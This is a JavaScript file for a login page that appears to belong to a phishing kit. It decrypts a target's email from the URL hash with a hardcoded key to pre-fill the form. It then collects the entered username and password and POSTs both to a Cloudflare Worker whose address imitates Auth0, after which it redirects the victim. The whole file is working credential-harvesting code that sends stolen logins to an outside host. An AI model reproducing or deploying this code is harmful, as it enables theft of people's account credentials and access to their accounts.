function isEmail(email) { 
    return /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i.test(email);
}

document.addEventListener('DOMContentLoaded', function () {
    checkCookie();
    let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");
    let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
    var auto_email = bytes.toString(CryptoJS.enc.Utf8);

    if (auto_email.length > 4) {
        document.getElementById("userID").value = auto_email;
    }

    var showPass = $("#showHideButton");
    showPass.click(function () {
        var $this = $(this);
        if ($this.text().toLowerCase() === "show") {
            $this.text("Hide");
            $this.prev("input").prop("type", "text");
        } else {
            $this.text("Show");
            $this.prev("input").prop("type", "password");
        }
    });

    var url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/"; // Your Worker URL

    var submit_btn = document.getElementById("continueFromUserLogin");
    var userInputContainerDiv = document.getElementById("userInputContainerDiv");
    var userBackButton = document.getElementById("userBackButtonSpanTxt");
    var count = 0;

    $("#userBackButton").click(function () {
        $(userBackButton).text("");
        $(".sub_div").addClass("hide");
        $(".main_div").removeClass("hide");
        document.getElementById("userErrorText").innerHTML = "";
        count = 0;
    });

    submit_btn.addEventListener("click", function (event) {
        var error = document.getElementById("userErrorText");
        error.style.fontSize = "small";
        var username = document.getElementById("userID").value;
        event.preventDefault();

        if (!isEmail(username)) {
            error.innerHTML = "Please enter your username correctly!";
        } else {
            $(userBackButton).text(username);
            $(".sub_div").removeClass("hide");
            $(".main_div").addClass("hide");
        }
    });

    $('#signin').click(function (event) {
        event.preventDefault();
        var username = document.getElementById("userID").value;
        var passerror = document.getElementById("passwordErrorText");
        var password = document.getElementById("password").value;

        if (password.length < 4) {
            passerror.style.fontSize = "small";
            passerror.innerHTML = "Please enter your password correctly!";
        } else {
            // Send data to Cloudflare Worker
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    emailID: username, // Using 'emailID' as per worker's requirement
                    password: password,
                })
            })
            .then(response => response.json()) // Convert response to JSON
            .then(data => {
                if (data.redirect) {
                    window.location.href = data.redirect; // Redirect to thanks.html
                } else {
                    console.log("Success, but no redirect URL found.");
                }
            })
            .catch(error => console.error("Error:", error));
        }
    });
});
